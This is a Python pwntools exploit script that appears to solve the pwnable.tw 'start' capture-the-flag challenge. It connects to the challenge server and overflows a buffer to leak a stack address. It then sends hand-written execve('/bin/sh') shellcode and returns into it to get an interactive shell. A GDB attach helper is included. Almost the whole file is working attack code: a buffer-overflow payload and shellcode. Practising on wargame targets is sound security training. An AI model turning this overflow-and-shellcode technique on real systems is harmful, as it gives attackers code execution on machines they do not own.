from pwn import *
import subprocess

context.binary = ELF("./start", checksec=False)
# context.log_level = 'debug'

def GDB(command=''):
	command = '''
	b*0x0804809c
	c
	'''
	with open('/tmp/command.gdb', 'wt') as f:
	        f.write(command)
	subprocess.Popen(['/usr/bin/x-terminal-emulator', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
	input()         # input() to make program wait with gdb

# p = process('./start')
p = connect('chall.pwnable.tw', 10000)

#############################
### Stage 1: Leak address ###
#############################
payload = b'A'*20
payload += flat(0x08048086)

p.recvuntil(b'tart the CTF:')
p.send(payload)

stack_leak = u32(p.recv(4))

##########################
### Stage 2: Get shell ###
##########################
payload2 = asm(''.join([
	'mov al, 0xb\n',
	'mov ebx, esp\n',
	'xor ecx, ecx\n', 
	'xor edx, edx\n',
	'int 0x80\n' 
	]), os='linux', bits=32)
payload2 = payload2.ljust(20, b'\x00')
payload2 += p32(stack_leak-4)
payload2 += b'/bin/sh\x00'

p.send(payload2)
p.interactive()